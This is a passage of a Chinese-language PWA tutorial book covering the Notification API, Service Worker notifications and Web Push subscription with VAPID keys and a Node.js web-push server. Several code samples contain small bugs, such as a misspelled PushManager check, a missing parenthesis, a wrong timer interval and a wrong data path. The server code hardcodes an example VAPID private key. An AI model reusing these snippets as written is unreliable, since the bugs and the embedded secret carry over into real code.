resolve(null)，因此在设计登录流程时，需要做好相应的降级措施。 举个例子，当站点已经存入身份凭证后，调用以下方法，将会弹出账号选择器： let promise = navigator.credentials.get({ password: true, federated: ['https://www.baidu.com'], mediation: 'required' }) 此时弹出的账号选择器如下图所示，可以看到，由于配置了 password 和 federated，因此密码凭证和联合凭证都显示在账号选择列表中： 如果去掉 federated 的配置，那么仅有密码凭证类型的帐号信息展现在账号选择列表中： 小结 在本节中介绍了凭证管理 API 常见的使用方式，通过示例展现凭证管理 API 对 Web App 登录流程的优化效果，我们相信将凭证管理 API 应用于 PWA 中，会有效增加登录用户留存。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter06/3-notification-api.html":{"url":"chapter06/3-notification-api.html","title":"6.3 桌面通知","keywords":"","body":"桌面通知 在 iOS 和 Android 移动设备中，Native App 向用户推送通知是很常见的行为，这是重新吸引用户访问应用最有效方法之一。然而推送通知一直被认为是 Web App 缺少的能力，在接下来的两节我们将介绍 Web App 如何实现推送通知。 Notification API 是 HTML5 新增的一套展示桌面通知的 API，桌面通知具有全局效果，它脱离了浏览器，采用和 Native App 相同的机制和 UI，因此无论网页是否打开，也无论浏览器是否在前台展现，只要浏览器在运行，就能够向用户展现通知。 应用通知主要有两种类型，一类是由应用本身生成的本地通知，另一类推送通知，是由服务器推送事件生成。在本节中主要先简单介绍如何使用 Notification API 进行本地通知，离线通知在下一节中会详细介绍。 在本节中我们将提供简单的通知示例，展示使用 Notification API 通知用户。在命令行中运行如下命令，下载示例代码到本地。 # 从 GitHub 下载代码到本地 pwa-book-demo 目录 $ git clone https://github.com/lavas-project/pwa-book-demo.git # 进入到 chapter06/notification 目录 $ cd chapter06/notification # 安装 npm 依赖 $ npm install # 安装成功后启动 chapter06/notification 示例 $ npm run server 在看到命令行中输出 Server start on: http://127.0.0.1:8088，意味着已经成功启动。 申请通知权限 为避免网站滥用 Notification 给用户造成影响，在展示桌面通知之前，首先需要向用户获取通知权限，只有获得用户授权之后，Notification API 才会生效。对于同一个域名下的网页，只需要获取一次授权即可。那么，如何知道当前站点是否已经被授权？ Notification.permission Notification.permission 是 Notification 的静态属性，代表通知权限的授权状态，取值包括： granted：允许展现通知； denied：禁止展现通知； default：用户尚未授权，此时禁止展现通知，但可以向用户发送授权申请。 在使用桌面通知之前，可以通过这个属性首先判断用户授权状态，再去做下一步操作： if (Notification.permission === 'granted') { // 用户已授权，可展示通知 } else if (Notification.permission === 'denied') { // 用户已禁止 } else { // 用户尚未授权，需首先向用户申请通知权限 } Notification.requestPermission() 当用户尚未进行授权时，可以通过 Notification.requestPermission() 静态方法向用户申请通知权限，使用方法如下所示： Notification.requestPermission().then(permission => { // 通过 permission 判断用户的选择结果 }) 这是一个异步函数，返回 Promise 对象。在调用函数的同时，页面会弹出通知权限请求对话框。在示例 public/script/notification.js 中，可以查看关于通知权限判断的逻辑。 打开浏览器，访问 http://127.0.0.1:8088 ，浏览器弹出如下图所示的弹窗。 用户可以选择 “允许”、“禁止”，也可以直接点击关闭对话框，分别对应 granted、denied 和 default 这三种授权行为，这时 promise 对象将 resolve 授权结果，并且同步更新 Notification.permission 的值。 当用户选择 “允许” 或 “禁止” 之后，选择结果会被浏览器记录下来，并在下次再次调用 Notification.requestPermission() 时将直接返回该结果。因此一旦用户选择了 “禁止”，站点将不会允许展示通知，也不会再次展现授权提示。Chrome 桌面版浏览器可以通过访问 chrome://settings/content/notifications 去修改已经进行授权的站点，而目前大部分手机浏览器则需要清除浏览器数据，才能够重新恢复通知权限请求对话框的展示，无论哪一种对于用户来说都是非常麻烦的操作。因此要求开发者应该在最适当的时候申请通知权限，并且对用户加以引导，说明站点获取通知权限的用途，尽量避免用户打开网站立即弹出授权对话框。 获得用户的授权之后，就可以进入下一步的通知展现与交互了。 通知展现与交互 浏览器提供通过实例化 Notification 对象来显示通知。实例化 Notification 的语法如下所示： const notification = new Notification(title, options) 在实例化 Notification 对象的同时，会生成一条通知并展现出来。在表现形式上桌面端和移动端存在一定差异，其中桌面端的通知会以卡片的形式从屏幕右上角或者右下角弹出，而移动端则显示在通知栏里。 通过实例化 Notification 时传入的不同参数，可以定制通知显示的内容和功能，下文介绍了常见参数的用法，更多用法可以参考 Notification 规范。需要注意的是，截止目前上述可选参数仅有 body、icon、data、tag 得到了稳定的支持，其余参数仅有部分浏览器支持，因此需要考虑部分配置失效的可能。 另外对于部分手机浏览器比如 Chrome for Android，要求必须依赖 Service Worker 所提供的方法来展现通知，使用 new Notification() 这种方式没有任何效果，因此本小节示例都使用 Service Worker 方法，在下文中会单独详细介绍使用 Service Worker 中的方法来展现通知。 展现配置项 title 和 body 标题和文本用于显示不同的通知信息，是最常见的通知形式。当标题和文本过长时，不同的浏览器和系统会展现不同的效果，有的会对通知进行截断处理。 const title = 'PWA-Book-Demo Notification Title' const options = { body: 'Simple piece of body text.\\nSecond line of body text :)' } const notification = new Notification(title, options) 以上示例在 PC Chrome 上显示效果如下图： 在手机上显示效果为： icon 配置图片 URL 地址，用来在标题和文本旁边显示的小图片。目前对于图标使用的图片尺寸，并没有可靠的规范和指导，如果我们的设备像素比（DPR）是 3，使用 192px 或更高的图片大小是比较好的选择。 在手机上展示效果类似下图： image 用于在通知中增加预览图片，由于桌面和移动设备的比例不同，不同手机上效果裁剪和比例也可能不同，同样很难对图片尺寸制定规范。 在手机上包含图片的通知有时会被折叠，需要用户向下滑动才将通知中的图片展示出来。下图是一个包含图片通知的示例： badge 展现缩略信息时使用的单色图标，用于向用户描述有关通知来源的更多信息，此选项只适用于移动设备，一般默认显示为浏览器的缩略图标。根据 Native App 经验，建议图片大小为 24px 乘像素比率，因此图片大小最好使用 72px 及以上。 direction dir 参数用于设置文本的显示方向，默认值为 auto，可取值为 ltr 和 rtl，分别代表“从左往右”和“从右往左”。在默认情况下，中文、英语、法语等会默认从左往右显示，而阿拉伯语等从右往左显示。 vibrate 用于设置通知的振动模式，参数格式为数字数组，数组描述了振动交替的毫秒数。例如 [200, 100] 代表首先振动 200 毫秒，然后停止 100 毫秒，如此反复。 交互配置项 tag 标签选项是一个字符串 ID，具有相同 tag 的通知会被分类到一起，可以简单的向用户显示多个通知。 通过以下示例可以了解 tag 的用法，先展示一个有 tag 为 \"error\" 的通知： const title = 'PWA-Book-Demo 测试 tag: error' const options = { body: '第一条 tag: error 通知', tag: 'error' } const notification = new Notification(title, options) 第一条提示如下图： 接着发送第二条新的 tag 为 \"warning\" 通知，如图所示： 最后仍然发送 tag 为 \"error\" 的第三条消息，可以看到这条消息静默替换了第一条消息： renotify 使用 tag 进行通知替代时，是没有声音和震动的。使用 renotify: true 可以在展示多个通知时也能够通过声音和震动提示用户。需要注意的是，renotify 是和 tag 选项配合使用的，如果设置了 renotify: true 但没有使用 tag 参数，浏览器可能会提示发生错误。 silent 通知展现的时候是否关闭声音和振动，默认为 false，表示默认展现通知时有声音有振动。如果通知不希望用户立即关注，可以设置为 true。如果同时定义了 silent 和 renotify，silent 优先级更高。 requireInteraction 在桌面端默认情况下，通知会在显示一段时间后自动隐藏，而在移动端上会一直显示通知，直到用户与其交互。如果希望桌面和移动端一致，可将 requireInteraction 设置为 true 。在使用这个配置项时需要格外而注意，因为这样可能会导致用户体验下降。 交互事件 Notification 实例具有以下方法： close()：关闭通知 举个例子，比如希望通知在展示 2 秒之后关闭，那么可以这么实现： let notification = new Notification('你好'); setTimeout(function () { notification.close() }, 2000) Notification 实例化对象具有以下事件句柄： onclick：通知点击事件 onclose：通知关闭事件，无论是用户手动关闭，还是调用 Notification.close() 均会触发 onshow：通知显示 onerror：通知显示异常事件 下面举一个简单的例子来展示通知的展现以及事件的处理。以下代码会弹出通知 “我是李雷，交个朋友吧”，点击通知后自动打开百度首页。 const notification = new Notification('你好', { body: '我叫李雷，交个朋友吧', icon: 'https://path/to/icon', data: { url: 'https://www.baidu.com' } }) notification.onclick = function (e) { // 关闭通知 notification.close() // 通过 notification.data 对象可以访问到实例化时传入的 data 参数 // 这里演示点击通知之后自动打开百度首页 window.open(notification.data.url) } 在 Service Worker 线程中展现通知 上面所介绍的 Notification API 用法全是写在页面主线程里的，在对应网页打开的情况下，即使切换标签页，最小化浏览器，都可以展现通知。但是一旦关闭网页，通知的相关代码随之失效，也就无法继续展现通知。因此需要将 Notification API 放到常驻后台的进程中去运行。 通过第四章对 Service Worker 的介绍，我们知道，Service Worker 是一个独立的 worker 线程，即使在关闭网页的情况下，Service Worker \b依然能够被唤醒，因此我们可以将展现通知的代码写到 Service Worker 文件中，就能够在页面关闭的情况下也可以向用户展现通知了。 在 Service Worker 作用域下无法直接使用 Notification，需要通过一些 Service Worker 所提供的函数去实现通知的展现与交互。其中，ServiceWorkerRegistration 对象提供了 showNotification() 和 getNotifications() 等方法，同时在 Service Worker 作用域下提供了 notificationclick 和 notificationclose 的全局事件回调。在本节后续的内容当中将会对这些方法和事件做详细的介绍。 ServiceWorkerRegistration 对象可通过以下方法获得： 在主线程中通过注册 Service Worker 所得到的异步返回对象即为 ServiceWorkerRegistration 的实例： // 注册 Service Worker 获取 registration navigator.serviceWorker.register('/service-worker.js').then(function (registration){ console.log(registration) }) // 使用 getRegistration 方法获取 registration navigator.serviceWorker.getRegistration().then(function (registration) { console.log(registration) }) 在 Service Worker 作用域下可直接通过 self.registration 获得： let registration = self.registration 在本节示例中，这两种方式我们都有用到，对于展现类的通知我们在 public/script/notification.js 直接封装了 displayNotification 方法，而与交互相关的事件监听在 public/sw.js 的 Service Worker 文件中可以查看。示例提供了不同类型的通知展示，如图点击对应的按钮可以查看通知效果。 展现通知 在 Service Worker 作用域下，通过 ServiceWorkerRegistration.showNotification() 方法来展现通知，其参数与上一小节 Notification 实例化的参数一致。该方法将返回一个 promise 对象，当通知正常展现时，promise 会 resolve 并返回 undefined，假如通知展示未获许可，那么 promise 将会 reject 并且抛出 TypeError 的异常，因此需要做好容错方案。 在 Service Worker 文件中展示通知如下。 self.registration.showNotification('你好', {/* options */}) .then(function () { // 通知展现成功 }) .catch(function (e) { // 通知展现未授权 }) 在主线程中展示通知如下。 navigator.serviceWorker.getRegistration().then(function (registration) { registration.showNotification('你好', {/* options */}) .then(function () { // 通知展现成功 }) .catch(function (e) { // 通知展现未授权 }) }) 添加 Actions 通知除了可以为用户展现信息，还可以在设计简单的交互来处理信息，用户不需要打开页面就可以快速与网站或服务交互。当使用 showNotification 展现通知时，第二个参数 options 将在原有基础上额外支持 action 参数。action 参数是一组自定义行为数组，该数组包括一组对象用于定义向用户显示的按钮。action 对象包括以下几个配置： action：按钮 ID 作为标识符字符串 title：向用户显示的文本的标题 icon：在动作旁边显示的图像的位置的图标 下面是一个简单的例子，在通知上展现一个 “点赞” 按钮，点击该按钮，将在控制台打印出 “点击了点赞按钮”： self.registration.showNotification('PWA-Book-Demo 测试 actions', { body: '点赞按钮可点击', actions: [ { action: 'like', title: '点赞', icon: '/assets/images/like-icon.png' } ] }) // 监听通知点击事件 self.addEventListener('notificationclick', function (e) { // 关闭通知 e.notification.close() if (e.action === 'like') { // 点击了“点赞”按钮 console.log('点击了点赞按钮') } else { // 点击了对话框的其他部分 console.log('点击了对话框') } }) actions 的展现样式会受到系统的影响，例如在 Android Nougat 及以上版本，并不会展示 action 的 icon，上面示例效果如图： 通知关闭事件 当用户选择忽略通知，比如点击通知的关闭十字或者滑动关闭通知时，notificationclose 事件会被调用，该事件通常用来分析用户与通知的交互情况。 self.addEventListener('notificationclose', function(event) { const dismissedNotification = event.notification const promiseChain = notificationCloseAnalytics() event.waitUntil(promiseChain }) 如上面示例所示，回调对象 event 提供常用的属性和方法用于控制后续逻辑。 event.notification 获取 notification 实例，访问 notification 实例的属性和方法。 event.waitUntil 方法允许传入 Promise 对象，待 Promise 异步操作完成后再结束事件。 如果通知定义展示了 actions 按钮，通过 event.action 可访问对应的 action。 通知点击事件 当用户点击通知时，默认不会关闭或者删除通知，也不会发生任何事情。而此时用户通常希望直接跳转到可以获取更多有关信息的位置，我们通过在 Service Worker 下监听点击事件 notificationclick 来处理相关逻辑。 示例中，在 Service Worker 作用域下是无法访问 window 对象的，但我们可以通过 clients.openWindow() 方法来实现在 Service Worker 作用域下打开网页。 查看示例中 Service Worker 文件 public/sw.js ，其中监听 notificationclick 事件。 // 首先监听 notificationclick 事件： self.addEventListener('notificationclick', function (e) { // 关闭通知 e.notification.close() // 打开网页 e.waitUntil(clients.openWindow(e.notification.data.url)) }) 在 public/script/notification.js 文件中触发通知展示。 // 接着触发显示通知 registration.showNotification('你好', { body: '我叫李雷，交个朋友吧', icon: 'https://gss0.baidu.com/9rkZbzqaKgQUohGko9WTAnF6hhy/assets/pwa/demo/pwa-icon.png', data: { time: new Date(Date.now()).toString(), url: 'https://www.baidu.com' } }) 点击示例页面中 \"事件：notificationclick \" 选项的按钮，对应的弹窗效果以及点击页面跳转情况如下图所示，可以看到即使在 Service Worker 作用域下，依然可以正常展示通知，并且能够引导打开网页： 这样整个弹出通知和打开网页的过程都完全脱离了网页生命周期的制约，我们已经能做到在未打开对应网页的情况下弹出离线通知，再通过点击通知引导用户打开网页了。当然，仅靠 Notification API 和 clients 并不能做到完全的离线通知，这是因为在目前的条件下，一旦页面销毁，Service Worker 也将很快进入休眠状态。因此需要给 Service Worker 注册可在离线情况下唤醒的事件，这样就能够完整地实现离线通知了。 这个事件就是接下来的小节将要介绍的如何实现在离线状态下的\b推送通知。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter06/4-web-push-api.html":{"url":"chapter06/4-web-push-api.html","title":"6.4 网络推送","keywords":"","body":"网络推送 在上一节我们已经介绍了使用 Notification API 如何创建推送并展示给用户，但是当浏览器没有打开，Service Worker 处于休眠状态时，如何将通知推送给用户呢？Native App 很早就实现了离线通知，用户在没有打开应用的情况下，也能够接收到推送的内容并且在通知栏展现出来。现在 Web App 使用 Push API 也可以实现离线接收消息。 Push API 和 Notification API 是不同但互补的功能，Push API 是用于订阅并推送消息给 Service Worker，而 Notification API 用于从 Service Worker 发送消息给用户。 一个完整的 Web Push 流程，只有浏览器是不够的，还需要服务端发送消息。在本节中，我们不仅会介绍消息推送在浏览器端\b相关的细节，还会实现一个简单的 Node.js 服务端来推送消息。 推送流程 在介绍 Push API 的用法之前，首先我们需要了解一下建立网络推送的基本流程。 下图所示的流程图出自 Web Push 协议草案，展示网络推送实现的整个基本流程。Web Push 协议是发送推送消息到浏览器的协议标准。它描述了如何创建推送消息，加密推送消息并将其发送到推送消息传递平台的结构和流程。 +-------+ +--------------+ +-------------+ | UA | | Push Service | | Application | +-------+ +--------------+ | Server | | | +-------------+ | Subscribe | | |--------------------->| | | Monitor | | || | | | | | Distribute Push Resource | |-------------------------------------------->| | | | : : : | | Push Message | | Push Message | 从图中可以看出，网络推送的建立涉及到三端的相互配合，分别是： UA（User Agent），即浏览器； Push Service，即推送服务器，用于管理推送订阅、消息推送等功能的第三方服务器。该服务器是浏览器决定的； Application Server，即网站应用的后端服务。 网络推送的过程中，浏览器和后端服务并不是直接接触的，需要通过浏览器指定的第三方推送服务器进行消息中转。 从具体的推送步骤上进行划分，又可以分成订阅（Subscribe）与推送（Push Message）两个部分。 其中订阅部分包含以下步骤： Subscribe，浏览器需要向推送服务器发起推送订阅的请求； Monitor，订阅成功之后，浏览器与推送服务器之间会进行通信，同时推送服务器会生成并维护相关订阅信息，在后续的消息推送流程将基于该订阅信息与浏览器保持通信； Distribute Push Resource，浏览器将推送服务器返回的订阅信息发送给网站后端服务进行保存，服务端将基于该订阅信息向推送服务器发起消息推送。 而推送部分主要分为两步： 后端服务通过 Web Push 向推送服务器发送消息通知，发送时会将前面提到的订阅信息带上，以告知推送服务器这条消息推送的目的地； 推送服务器接收到消息之后，再根据订阅信息将消息推送给对应的浏览器。 至此就完成了整个推送流程。 接下来，我们将对推送流程的具体步骤进行介绍。 订阅推送 在我们可以发送推送消息之前，必须先订阅推送服务。Push API 提供 PushManager 接口请求和推送通知，在第四章 Service Worker 的学习中我们知道，当 Service Worker 注册成功时，会返回一个 ServiceWorkerRegistration 的实例对象 registration，其中 PushManager 的实例 pushManager 就挂到了 registration 对象下面，因此我们可以通过调用 registration.pushManager.subscribe() 进行订阅。 由于存在兼容性问题，因此在调用之前需要判断 PushManager 是否存在： if (window.PushMananger !== null) { // 发起推送订阅 } 假设用户启用了通知，现在我们可以订阅推送服务： async function subscribe () { // 判断兼容性 if (window.PushManager == null && navigator.serviceWorker == null) { return } // 注册 service-worker.js 获取 ServiceWorkerRegistration 对象 let registration = await navigator.serviceWorker.register('/service-worker', {scope: '/'}) // 发起推送订阅 let pushSubscription = await registration.pushManager.subscribe({ userVisibleOnly：true, applicationServerKey: base64ToUint8Array('BLjmecELgzCq4S-fJyRx9j03wvR0yjSs6O13L6qABrj7CadS8689Lvi2iErzG8SeaPSX_ezoyD2O0MMkGZcj4c0') }) // 将 pushSubscription 发送给应用后端服务器 await distributePushResource(pushSubscription) } 在上面的实例中，subscribe 方法接受 userVisibleOnly 参数，如果该参数为 true 但没有调用 Notification API 时，浏览器会弹出默认的提示框提示有应用程序在后台运行，确保每个消息都有匹配的通知。对于部分浏览器而言（如 Chrome for Android），该属性必须设置为 true，不然会报错。 订阅成功后，推送服务器返回订阅信息 pushSubscription 对象， pushSubscription 的结构如下： {\"endpoint\":\"https://fcm.googleapis.com/fcm/send/dpH5lCsTSSM:APA91bHqjZxM0VImWWqDRN7U0a3AycjUf4O-byuxb_wJsKRaKvV_iKw56s16ekq6FUqoCF7k2nICUpd8fHPxVTgqLunFeVeB9lLCQZyohyAztTH8ZQL9WCxKpA6dvTG_TUIhQUFq_n\", \"keys\": { \"p256dh\":\"BLQELIDm-6b9Bl07YrEuXJ4BL_YBVQ0dvt9NQGGJxIQidJWHPNa9YrouvcQ9d7_MqzvGS9Alz60SZNCG3qfpk=\", \"auth\":\"4vQK-SvRAN5eo-8ASlrwA==\" } } pushSubscription 包含公钥和 endpointURL，应用服务器推送时可以使用公钥对消息加密，endpointURL 是由推送服务器生成包含唯一标识符的 URL，推送服务器通过它判断将消息发送到哪个客户端。 可分别通过 pushSubscription.getKey('p256dh') 和 pushSubscription.getKey('auth') 来获取密钥和校验码信息。由于通过 getKey() 方法获取到的密钥信息类型为 ArrayBuffer，因此还需要通过转码将其转成 base64 字符串以便于传输。转换函数如下所示： function uint8ArrayToBase64 (arr) { return btoa(String.fromCharCode.apply(null, new Uint8Array(arr))) } 这样，我们只需要将 pushSubscription 的 endpoint、p256dh、auth 进行包装并发送 POST 请求传给应用服务器，应用服务器只需要将这个 pushSubscription 接收到并保存起来即可。比如在这里使用 Fetch API 来演示数据传输： function distributePushResource (pushSubscription) { return fetch('/path/to/subscribe', { method: 'post', body: JSON.stringify({ endpoint: pushSubscription.endpoint, keys: { p256dh: uint8ArrayToBase64(pushSubscription.getKey('p256dh')), auth: uint8ArrayToBase64(pushSubscription.getKey('auth')) } }) }) } 以上就是推送订阅的说明。订阅好推送之后，下面就能够接收推送信息了。 使用 VAPID 读者可能已经注意到，在上文订阅推送 subscribe 方法中，还传入了一个 applicationServerKey 参数给推送服务，这个参数的作用是什么呢？ Web Push 协议出于用户隐私考虑，在应用和推送服务器之间没有进行强身份验证，这为用户应用和推送服务都带来了一定的风险。解决方案是对 Web Push 使用自主应用服务器标识（VAPID）协议，VAPID 规范允许应用服务器向推送服务器标识身份，推送服务器知道哪个应用服务器订阅了用户，并确保它也是向用户推送信息的服务器。使用 VAPID 服务过程很简单，通过几个步骤可以理解 VAPID 如何实现安全性。 应用服务器创建一对公钥/私钥，并将公钥提供给 Web App 客户端 当用户尝试订阅推送服务时，将公钥添加到 subscribe() 订阅方法中，公钥将被发送到推送服务保存。 应用服务器想要推送消息时，发送包含公钥和已经签名的 JSON Web 令牌到推送服务提供的 API，推送服务验证通过后，将信息推送至 Web App 客户端。 为了避免处理过多加密细节，在这里我们只需简单了解 VAPID 规范即可，因为目前已经有很多库来帮助开发者生成公钥，从而大大减少开发工作量。假设开发者使用 Node.js 作为服务端语言，那么可以通过安装 web-push 来协助生成公钥。 首先通过 npm install 安装 web-push： npm install web-push -g 然后就可以通过命令行生成公钥和私钥了： web-push generate-vapid-keys 得到的结果如下所示： ======================================= Public Key: BLjmecELgzCq4S-fJyRx9j03wvR0yjSs6O13L6qABrj7CadS8689Lvi2iErzG8SeaPSX_ezoyD2O0MMkGZcj4c0 Private Key: wNY2Jw8Zcw2wjfsiVzIxQB6K-ZoOkn-MS7fXxoo8w0Y ======================================= 正如在订阅推送中提到的，subscribe 方法通过 applicationServerKey 传入所需要的公钥。一般来说得到的公钥一般都是 base64 编码后的字符串，需要将其转换成 Uint8Array 格式才能作为 subscribe 的参数传入。下面给出一个 base64 转 Uint8Array 的函数实现： function base64ToUint8Array (base64String) { let padding = '='.repeat((4 - base64String.length % 4) % 4) let base64 = (base64String + padding) .replace(/\\-/g, '+') .replace(/_/g, '/') let rawData = atob(base64) let outputArray = new Uint8Array(rawData.length) for (let i = 0; i 在下文中我们也会继续了解，在消息推送服务端如何使用 VAPID 协议。 消息推送 接下来介绍如何使用 Web Push 协议向浏览器发送推送消息，消息推送需要依赖浏览器接收推送消息和后端服务推送消息两个部分。 浏览器接收推送消息 首先我们来研究浏览器如何接收推送消息。在完成推送订阅之后，浏览器与推送服务器建立了通信，此时浏览器可以通过监听 push 事件来接收推送服务发送的消息。 push 事件只会在 Service Worker 作用域下触发，因此只需要在 Service Worker 作用域下注册监听该事件即可： self.addEventListener('push', function (e) { if (e.data) { // 显示推送消息 console.log(e.data.text()) } }) 消息通过事件回调下面的 data 属性获取。data 提供了以下方法来实现不同类型的消息进行解析： arrayBuffer()：将消息解析成 ArrayBuffer 对象； blob()：将消息解析成 Blob 对象； json()：将消息解析成 JSON 对象； text()：将消息解析成字符串； 需要注意的是，当推送服务器推送的消息没有任何数据时，data 属性可能为空，因此需要做好代码容错。 后端服务推送消息 当浏览器做好推送通知的接收工作之后，接下来需要实现后端服务推送消息。正如前面所提到的那样，第三方推送服务是由浏览器决定的，因此可能存在不同的浏览器对应不一样的第三方推送服务，而不同的第三方推送服务所要求的后端配置也是不一样的，因此在开发的时候，需要针对不同浏览器的不同推送服务，开发不同的后端推送服务，当然也可以选择一些现成的跨平台推送方案，如 OneSignal，这些跨平台推送方案已经集成好了多种浏览器的推送服务，使得开发者不再需要去关心不同浏览器的推送服务适配问题。 在这里我们演示一段基于 Chrome 浏览器的后端推送服务代码。Chrome 浏览器所对应的推送服务器为 Firebase 云服务（FCM），假设应用服务后端使用 Node.js，那么我们可以使用 web-push 库来实现后端向推送服务器发送消息的方法： const webpush = require('web-push') const vapidKeys = { publicKey: 'BLjmecELgzCq4S-fJyRx9j03wvR0yjSs6O13L6qABrj7CadS8689Lvi2iErzG8SeaPSX_ezoyD2O0MMkGZcj4c0', privateKey: 'wNY2Jw8Zcw2wjfsiVzIxQB6K-ZoOkn-MS7fXxoo8w0Y' } webpush.setVapidDetails( 'mailto:your-email@provider.com', vapidKeys.publicKey, vapidKeys.privateKey ) webpush.setGCMAPIKey('') module.exports = function pushMessage (pushSubscription, message) { return webpush.sendNotification(pushSubscription, message) } 其中 vapidKeys 就是生成的公钥和私钥，它们也可以通过 webpush.generateVAPIDKeys() 在程序运行时调用该函数生成。但需要注意的是，公钥和私钥只需要生成一次，后续直接使用生成好的值即可。生成的公钥和私钥需要传入 webpush.setVapidDetails() 函数中对 web-push 进行配置。 接着是 webpush.setGCMAPIKey()，这个函数需要传入 Firebase 云服务（FCM）申请到的 GCMAPIKey。 配置好之后，就可以使用 webpush.sendNotification() 方法推送消息了。该方法第一个参数需要传入 pushSubscription，也就是推送订阅的最后一步中，浏览器向后端服务发送的 pushSubscription 对象。 后端服务在存储 pushSubscription 的时候，需要做好用户信息与 pushSubscription 的映射关系，这样，后续想要给哪个用户推送消息，只需要获取对应的 pushSubscription 即可。 sendNotification() 方法传入的第二个参数就是想要推送给用户的信息，它可以是字符串、或者 node Buffer。比如我们可以通过 JSON.stringify(obj) 的方式来向浏览器推送一个对象信息： webpush.sendNotification(pushSubscription, JSON.stringify({ msg: 'Hello World', url: 'https://www.baidu.com' })) 那么在浏览器就可以通过如下方式接收信息： self.addEventListener('push', e => { let payload = e.data.json() console.log(payload.msg) console.log(payload.url) }) 这样，就实现了应用后端向浏览器推送消息的流程。 取消订阅 当网站在完成推送订阅之后，Web Push API 也提供了相应的方法来取消订阅。前面提到推送订阅成功之后 PushManager.subscribe() 方法返回的 pushSubscription 对象上有一个 unsubscribe() 就是用来取消订阅的： pushSubscription.unsubscribe().then(function () { console.log('取消订阅成功！') }) 在取消订阅之前，我们可以通过 PushManager.getSubscription() 方法来判断用户是否已经订阅，如果用户已经订阅过，那么该函数会返回 pushSubscription 对象，这样接下来再调用 unsubscribe() 方法最终取消订阅。完整的代码如下所示： registration.pushManager.getSubscription().then(function (pushSubscription) { if (!pushSubscription) { // 用户尚未订阅 return } // 取消订阅 return pushSubscription.unsubscribe() }) .then(function () { console.log('取消订阅！') }) 结合 Notification 实现离线通知推送 有了 Push API，结合前面学习到的 Notification API 和 clients，我们就能够做到完整的离线通知推送了。接下来我们通过一个例子，来实现在离线情况下接收推送通知，点击通知后自动打开网页的这么一个功能。 在命令行中运行如下命令，下载示例代码到本地。 # 从 GitHub 下载代码到本地 pwa-book-demo 目录 $ git clone https://github.com/lavas-project/pwa-book-demo.git # 进入到 chapter06/web-push 目录 $ cd chapter06/web-push # 安装 npm 依赖 $ npm install 首先我们通过执行 web-push generate-vapid-keys命令生成 VAPIDKeys，在 server/config.js 文件中配置 VAPIDKeys 公钥和私钥，以及配置 Firebase 云服务（FCM）生成的 GCMAPIkey。 module.exports = { VAPIDKeys: { publicKey: '', privateKey: '' }, GCMAPIkey: 'FCM Public Key' } 接下来我们需要准备主线程 JS 文件，用来完成注册 Service Worker、申请桌面通知权限、订阅推送等等工作，可查看示例中 public/script.js 文件。 // entry.js const VAPIDPublicKey = '' // 注册 service worker 并缓存 registration let registration function registerServiceWorker () { if (!navigator.serviceWorker) { return Promise.reject('系统不支持 service worker') } return navigator.serviceWorker.register('/service-worker.js').then(function (reg) { registration = reg }) } // 申请桌面通知权限 function requestNotificationPermission () { // 系统不支持桌面通知 if (!window.Notification) { return Promise.reject('系统不支持桌面通知') } return Notification.requestPermission() .then(function (permission) { if (permission === 'granted') { return Promise.resolve() } return Promise.reject('用户已禁止桌面通知权限') }) } // 订阅推送并将订阅结果发送给后端 function subscribeAndDistribute (registration) { if (!window.PushManager) { return Promise.reject('系统不支持消息推送') } // 检查是否已经订阅过 return registration.pushManager.getSubscription().then(function (subscription) { // 如果已经订阅过，就不重新订阅了 if (subscription) { return } // 如果尚未订阅则发起推送订阅 let publicKey = 'BLjmecELgzCq4S-fJyRx9j03wvR0yjSs6O13L6qABrj7CadS8689Lvi2iErzG8SeaPSX_ezoyD2O0MMkGZcj4c0' return registration.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: base64ToUint8Array(publicKey) }) // 订阅推送成功之后，将订阅信息传给后端服务器 .then(function (subscription) { distributePushResource(subscription) }) }) } function distributePushResource (subscription) { // 假设后端接收并存储订阅对象的接口为 '/api/push/subscribe' return fetch('/api/push/subscribe', { method: 'post', body: JSON.stringify({ endpoint: subscription.endpoint, keys: { p256dh: uint8ArrayToBase64(subscription.getKey('p256dh')), auth: uint8ArrayToBase64(subscription.getKey('auth')) } }) }) } // 注册 service worker registerServiceWorker() // 申请桌面通知权限 .then(function () { requestNotificationPermission() }) // 订阅推送 .then(function () { subscribeAndDistribute(registration) }) .catch(function (err) { console.log(err) }) 在 public/sw.js 文件中，做好推送事件和通知点击事件的监听： // 监听 push 事件 self.addEventListener('push', function (e) { if (!e.data) { return } // 解析获取推送消息 let payload = e.data.json() // 根据推送消息生成桌面通知并展现出来 let promise = self.registration.showNotification(payload.title, { body: payload.body, icon: payload.icon, data: { url: payload.url } }) e.waitUntil(promise) }) // 监听通知点击事件 self.addEventListener('notificationclick', function (e) { // 关闭窗口 e.notification.close() // 打开网页 e.waitUntil(clients.openWindow(e.data.url)) }) 然后我们准备一个简单的 public/index.html 文件作为前端入口： Web Push API 你好，很高兴认识你 > 接下来准备服务端代码 server/index.js，服务端代码主要做两件事情： 提供接口存储 pushScription 对象； 跑定时任务，每隔一小时就向所有订阅过的浏览器推送消息； // server.js const webpush = require('web-push') const express = require('express') const path = require('path') // 配置 web push webpush.setVapidDetails( 'mailto:your-email@provider.com', 'BLjmecELgzCq4S-fJyRx9j03wvR0yjSs6O13L6qABrj7CadS8689Lvi2iErzG8SeaPSX_ezoyD2O0MMkGZcj4c0', 'wNY2Jw8Zcw2wjfsiVzIxQB6K-ZoOkn-MS7fXxoo8w0Y' ) webpush.setGCMAPIKey('') // 存储 pushSubscription 对象 let pushSubscriptionSet = new Set() // 定时任务，每隔 10 分钟向推送服务器发送消息 setInterval(function () { if (pushSubscriptionSet.size > 0) { pushSubscriptionSet.forEach(function (pushSubscription) { webpush.sendNotification(pushSubscription, JSON.stringify({ title: '你好', body: '我叫李雷，很高兴认识你', icon: 'https://path/to/icon', url: 'http://localhost' })) }) } }, 10 * 60) const app = new express() // 服务端提供接口接收并存储 pushSubscription app.post('/api/push/subscribe', function (req, res) { if (req.body) { try { pushSubscriptionSet.add(req.body) res.sendStatus(200) } catch (e) { res.sendStatus(403) } } else { res.sendStatus(403) } }) // 静态资源 app.get('/', function (req, res) { res.sendFile(path.resolve(__dirname, 'index.html')) }) app.get('/entry.js', function (req, res) { 